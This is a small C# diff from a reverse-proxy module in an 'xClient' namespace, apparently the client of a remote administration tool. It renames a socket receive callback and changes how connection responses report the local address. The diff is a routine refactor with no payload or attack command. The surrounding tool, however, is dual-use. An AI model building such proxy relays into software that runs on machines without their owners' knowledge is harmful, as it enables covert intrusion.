@@ -43,24 +43,24 @@ namespace xClient.Core.ReverseProxy
                 try
                 {
                     this._buffer = new byte[BUFFER_SIZE];
-                    this.Handle.BeginReceive(_buffer, 0, _buffer.Length, SocketFlags.None, Handle_BeginReceive, null);
+                    this.Handle.BeginReceive(_buffer, 0, _buffer.Length, SocketFlags.None, AsyncReceive, null);
                 }
                 catch
                 {
-                    new ReverseProxyConnectResponse(ConnectionId, false, 0, 0, this.Target).Execute(Client);
+                    new ReverseProxyConnectResponse(ConnectionId, false, null, 0, this.Target).Execute(Client);
                     Disconnect();
                 }
 
                 IPEndPoint localEndPoint = (IPEndPoint)this.Handle.LocalEndPoint;
-                new ReverseProxyConnectResponse(ConnectionId, true, localEndPoint.Address.Address, localEndPoint.Port, this.Target).Execute(Client);
+                new ReverseProxyConnectResponse(ConnectionId, true, localEndPoint.Address, localEndPoint.Port, this.Target).Execute(Client);
             }
             else
             {
-                new ReverseProxyConnectResponse(ConnectionId, false, 0, 0, this.Target).Execute(Client);
+                new ReverseProxyConnectResponse(ConnectionId, false, null, 0, this.Target).Execute(Client);
             }
         }
 
-        private void Handle_BeginReceive(IAsyncResult ar)
+        private void AsyncReceive(IAsyncResult ar)
         {
             //Receive here data from e.g. a WebServer
 
@@ -86,7 +86,7 @@ namespace xClient.Core.ReverseProxy
 
             try
             {
-                this.Handle.BeginReceive(_buffer, 0, _buffer.Length, SocketFlags.None, Handle_BeginReceive, null);
+                this.Handle.BeginReceive(_buffer, 0, _buffer.Length, SocketFlags.None, AsyncReceive, null);
             }
             catch
             {
